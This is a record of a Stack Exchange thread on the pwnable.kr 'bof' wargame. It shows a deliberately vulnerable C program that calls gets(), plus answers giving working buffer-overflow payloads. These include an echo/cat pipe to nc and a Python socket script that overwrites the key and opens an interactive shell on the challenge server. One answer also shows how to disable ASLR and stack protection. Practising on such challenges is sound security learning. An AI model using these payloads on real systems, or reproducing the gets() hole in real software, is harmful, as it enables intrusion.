@@ -1,0 +1,85 @@
+{
+    "title": "How to effectively bypass GCC stack smashing detection",
+    "link": "https://reverseengineering.stackexchange.com/questions/11777/how-to-effectively-bypass-gcc-stack-smashing-detection",
+    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I was solving bof challenge on <a href=\"http://pwnable.kr/play.php\" rel=\"noreferrer\">http://pwnable.kr/play.php</a>\nit is required to smash the stack of the following code </p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\nvoid func(int key){\n    char overflowme[32];\n    printf(\"overflow me : \");\n    gets(overflowme);   // smash me!\n    if(key != 0xcafebabe){\n        system(\"/bin/sh\");\n    }\n    else{\n        printf(\"Nah..\\n\");\n    }\n}\nint main(int argc, char* argv[]){\n    func(0xdeadbeef);\n    return 0;\n}\n</code></pre>\n<p>and I was given compiler version of that I was supposed to exploit\nthe task was straightforward but when I overflow the array <code>overflowme</code> the control I never transfered to <code>/bin/sh</code> instead I get something like\n<code>*** stack smashing detected ***: ./bof terminated</code>\nattempt1:\ntry filling the array with zeros except for the <code>key</code> but failed\nattempt2:\nget memory dump for where the array is stored and overflow the array with that dump but still failed</p>\n</div>",
+    "votes": "6",
+    "answers": 3,
+    "views": "18k",
+    "tags": [
+        "gdb",
+        "c",
+        "buffer-overflow"
+    ],
+    "user": "u185619",
+    "time": "Jan 16, 2016 at 22:16",
+    "comments": [
+        {
+            "user": "jvoisin",
+            "text": "<span class=\"comment-copy\">I'm voting to close this question as off-topic because I don't think that stackexchange is the right place to spoil wargames : they are meant to be played, and posting a complete solution will kill the fun for every player.</span>",
+            "time": null
+        },
+        {
+            "user": "Solomon Ucko",
+            "text": "<span class=\"comment-copy\">The reason the prefix is 52 bytes instead of 32 is there are also 8 bytes of canary, plus 8 bytes between the canary and the edge of the stack (the canary is at Stack[-0x10]) and 4 bytes between the edge of the stack and the parameter (the parameter is at Stack[0x4]), for a total of 20 bytes extra.</span>",
+            "time": null
+        }
+    ],
+    "answers_data": [
+        {
+            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>The answer from Jason is the correct solution. However, I wanted to give an alternative answer without Python, but from the terminal. IMO Python is always preferred for better automation, but sometimes you just wanna have a quick exploit done without extra tools.</p>\n<p>With that in mind, one's natural attempt would be something like below:</p>\n<pre><code>echo -e \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xbe\\xba\\xfe\\xca\\x0a\" | nc pwnable.kr 9000\n</code></pre>\n<p>After all, this is an exact replica of the code above in Python, right? Except, the server begs to differ:</p>\n<blockquote>\n<p>*** stack smashing detected ***: /home/bof/bof terminated overflow me :</p>\n</blockquote>\n<p>So, what is the problem, then?</p>\n<p>Think about the command above, for a moment. It sends a bunch of characters to the stdin of the remote process, in the hopes of running /bin/sh. However, we still get greeted by the error. The reason for this, is that we are sending the correct payload, but then we are <em>stopping</em>. EOF. /bin/sh has no input, so execution continues to the next line, until the stack protector kicks in.</p>\n<p>The reason why Python works and the <code>echo</code> command doesn't, is continuity. Python doesn't close the stream, while the terminal version does.</p>\n<p>To prove it, here's a slightly longer version of the terminal exploit, which actually works:</p>\n<pre><code>echo -e \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xbe\\xba\\xfe\\xca\\x0a\" &gt; payload.bin\n</code></pre>\n<p>First, we save the exact payload as before, to a file named payload.bin in this case. Next, we run the following command:</p>\n<pre><code>cat payload.bin - | nc pwnable.kr 9000\n</code></pre>\n<p>(Note the - after payload.bin, after cat is done outputting contents of payload.bin, it will start outputting whatever comes in via stdin)</p>\n<p>And voila! Now you are actually in. You can try typing shell commands, such as <code>cat flag</code>, or <code>touch /tmp/pwned</code> or whatever you like.</p>\n<p>Whew! That was long. Hope this info will help other confused souls as it did help me a while ago.</p>\n</div>",
+            "votes": "8",
+            "user": "BitParser",
+            "time": "Aug 21, 2018 at 15:31",
+            "is_accepted": true,
+            "comments": []
+        },
+        {
+            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>You don't need to bypass gcc's stack smashing detection. If you overwrite <code>key</code> correctly, you get an interactive shell before the stack check is performed at the end of <code>func()</code>. Here's the proof in the form of a Python script:</p>\n<pre><code>import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"pwnable.kr\", 9000))\ns.send(\"A\"*52 + \"\\xBE\\xBA\\xFE\\xCA\" + \"\\x0A\")\nprint \"You now have an interactive shell :)\"\nwhile True:\n    s.send(raw_input() + \"\\x0A\")\n    print s.recv(1024)\n</code></pre>\n</div>",
+            "votes": "8",
+            "user": "Jason Geffner",
+            "time": "Jan 16, 2016 at 23:10",
+            "is_accepted": false,
+            "comments": [
+                {
+                    "user": "u185619",
+                    "text": "<span class=\"comment-copy\">well I tried this <code>echo -n -e \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbe\\xba\\xfe\\xca\\x00\" | nc pwnable.kr 9000</code> but it didn't work If you can spot If I missed something</span>",
+                    "time": null
+                },
+                {
+                    "user": "Jason Geffner",
+                    "text": "<span class=\"comment-copy\"><code>gets()</code> expects a line-feed character at the end of the input string, but you're instead using a null-byte at the end of your <code>echo</code> statement.</span>",
+                    "time": null
+                },
+                {
+                    "user": "Jason Geffner",
+                    "text": "<span class=\"comment-copy\">Also, I don't think <code>\\x00</code> works with <code>echo</code>.</span>",
+                    "time": null
+                },
+                {
+                    "user": "u185619",
+                    "text": "<span class=\"comment-copy\">actually it did work you can verify by piping the output to xxd</span>",
+                    "time": null
+                },
+                {
+                    "user": "BitParser",
+                    "text": "<span class=\"comment-copy\">@AhmedAbdElMawgood very old question, but I have posted an answer that might help you understand why the version with echo won't work.</span>",
+                    "time": null
+                }
+            ]
+        },
+        {
+            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>first, you should disable ASLR system-wide,  you can do this as follows:</p>\n<pre><code>echo \"0\" &gt; /proc/sys/kernel/randomize_va_space\n</code></pre>\n<p>second, compile your program using flag with -zexecstack -fno-stack-protector -g </p>\n<p>example <code>gcc program.c -o program -zexecstack -fno-stack-protector -g</code></p>\n<p>cheers :)</p>\n</div>",
+            "votes": "6",
+            "user": "Febriyanto Nugroho",
+            "time": "Oct 7, 2018 at 8:46",
+            "is_accepted": false,
+            "comments": [
+                {
+                    "user": "BitParser",
+                    "text": "<span class=\"comment-copy\">This won't help get that remote flag though :/</span>",
+                    "time": null
+                }
+            ]
+        }
+    ]
+}
